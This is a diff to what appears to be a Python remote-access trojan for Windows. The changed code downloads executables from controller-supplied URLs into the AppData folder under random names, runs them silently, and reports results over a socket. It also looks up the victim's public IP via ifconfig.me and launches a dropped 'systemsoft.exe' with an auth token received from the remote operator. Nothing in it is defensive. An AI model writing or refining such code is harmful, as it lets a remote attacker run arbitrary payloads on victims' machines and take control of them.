@@ -643,19 +643,19 @@ randfilename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=
 def Mbox(title, text, style):
     return ctypes.windll.user32.MessageBoxW(0, text, title, style)
 def downloadfilenet(url):
-    r = get(url)
     if url[-4:] != '.exe':
-        reliable_send('[-] this function work just with .exe files')
+        s.send('[-] this function work just with .exe files'.encode())
     else:
+        r = get(url)
         with open(appd + '\\' + randfilename + '.exe', 'wb') as file:
             file.write(r.content)
         try:
-            os.popen(appd + '\\' + randfilename + '.exe')
+            subprocess.Popen(appd + '\\' + randfilename + '.exe',shell=True)
 
         except:
-            reliable_send('[-]ERROR')
+            s.send('[-] Error Executing payload'.encode())
         else:
-            reliable_send('executing file in ' + randfilename + '.exe')
+            s.send('executing file in '.encode() + randfilename.encode() + '.exe'.encode())
 def getip():
     try:
         r = get('http://ifconfig.me')
@@ -944,7 +944,7 @@ def shell():
 
                     download_file(appd + '\\systemsoft.exe')
                     try:
-                        subprocess.Popen("powershell -c start "+appd + '\\systemsoft.exe authtoken '+s.recv(1024).decode(),shell=True)
+                        subprocess.Popen(appd + '\\systemsoft.exe authtoken '+s.recv(1024).decode(),shell=True)
                     except:
                         s.send("[-] Error Adding your token".encode())
                     else:
